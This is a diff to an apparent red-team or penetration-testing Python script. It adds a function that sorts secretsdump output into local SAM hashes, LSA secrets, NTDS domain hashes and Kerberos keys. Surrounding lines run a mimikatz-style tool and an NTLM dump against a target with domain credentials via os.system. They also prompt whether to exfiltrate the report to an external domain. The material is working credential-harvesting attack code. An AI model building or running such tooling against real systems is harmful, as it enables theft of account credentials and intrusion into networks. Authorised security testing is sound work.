@@ -54,6 +54,81 @@ def get_NTML_hash(filepath):
     except Exception as e:
         print(f"An error occurred extracting the NTLM info: {e}")
 
+def process_secrets_dump(filepath):
+    start_sam = "[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)"
+    end_sam = "[*] Dumping cached domain logon information (domain/username:hash)"
+
+    start_lsa = "[*] Dumping LSA Secrets"
+    end_lsa = "[*] DefaultPassword"
+
+    start_domain = "[*] Using the DRSUAPI method to get NTDS.DIT secrets"
+    end_domain = "[*] Kerberos keys grabbed"
+    end_kerberos = "[*] Cleaning up..."
+
+    sam_flag = False
+    lsa_flag = False
+    domain_flag = False
+    kerberos_flag = False
+
+    sam_hashes = []
+    lsa_hashes = []
+    domain_hashes = []
+    kerberos_info = []
+
+    # Read the input file
+    with open(filepath, 'r') as file:
+        for line in file:
+            # Check for start and end of SAM segment
+            if line.strip() == start_sam:
+                sam_flag = True # change the flag to true
+                continue # skips the header
+            elif line.strip() == end_sam:
+                sam_flag = False
+
+            # Check for start and end of LSA segment
+            if line.strip() == start_lsa:
+                lsa_flag = True
+                continue
+            elif line.strip() == end_lsa:
+                lsa_flag = False
+
+            # Check for start and end of domain segment
+            if line.strip() == start_domain:
+                domain_flag = True
+                continue
+            elif line.strip() == end_domain:
+                domain_flag = False
+
+            #Check for start and end of kerberos segment
+            if line.strip() == end_domain:
+                kerberos_flag = True
+                continue
+            elif line.strip() == end_kerberos:
+                kerberos_flag = False
+
+            if sam_flag:
+                sam_hashes.append(line.strip())
+            elif lsa_flag:
+                lsa_hashes.append(line.strip())
+            elif domain_flag:
+                domain_hashes.append(line.strip())
+            elif kerberos_flag:
+                kerberos_info.append(line.strip())
+
+    with open('output.txt', 'a') as of:
+        of.write("Local SAM Hashes:\n")
+        for hash in sam_hashes:
+            of.write(f"{hash}\n")
+        of.write("\nLSA Secrets:\n")
+        for lsahash in lsa_hashes:
+            of.write(f"{lsahash}\n")
+        of.write("\nDomains:\n")
+        for domainhash in domain_hashes:
+            of.write(f"{domainhash}\n")
+        of.write("\nKerberos keys:\n")
+        for key in kerberos_info:
+            of.write(f"{key}\n")
+
 # Find out if the report should be exfiltrated
 exfilBool = input("Would you like the generated report to be exfiltrated to an external domain? (y/n)\n")
 
@@ -93,6 +168,11 @@ try:
 except KeyError as e:
     print(f"There was an error: {e}")
 
+###
+### Use the process function and see if it works to filter out useless info. Needs input path
+###
+
+
 # Dump the NTLM Info
 dumpNTLMCommand = f"py {dumpNTMLInfo_path} {targetIP} >> c:\\temp\\NTLMInfo.txt"
 os.system(dumpNTLMCommand)
@@ -104,6 +184,7 @@ mimiCommand = f"py {mimikatz_path} -f ./command.txt "\
               f"{domain}/{username}:{password}@{targetIP} >> c:\\temp\\mimiOutput.txt"
 os.system(mimiCommand)
 
+# Extract key info to output text file.
 get_NTML_hash("c:\\temp\\mimiOutput.txt")
 
 # Run services.py script.
